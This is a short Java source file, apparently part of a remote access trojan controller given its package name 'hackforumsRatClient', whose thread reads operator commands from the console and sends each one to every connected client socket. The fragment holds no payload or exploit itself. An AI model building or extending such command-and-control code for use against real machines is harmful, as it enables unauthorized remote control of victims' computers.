package hackforumsRatClient;

import java.io.IOException;
import java.io.PrintWriter;
import java.net.Socket;
import java.util.Scanner;

public class messageThread implements Runnable {	
	public void run() {
		while(true){
			System.out.println(">>");
			Scanner in = new Scanner(System.in);
			String command = in.nextLine();
			
			for(Socket clientToSendCommand : Main.connectedClients){
	            try {
					PrintWriter commandWriter = new PrintWriter(clientToSendCommand.getOutputStream());
					commandWriter.println(command);
					commandWriter.flush();
				} catch (IOException e) {
					e.printStackTrace();
				}

			}
		}
	}
}
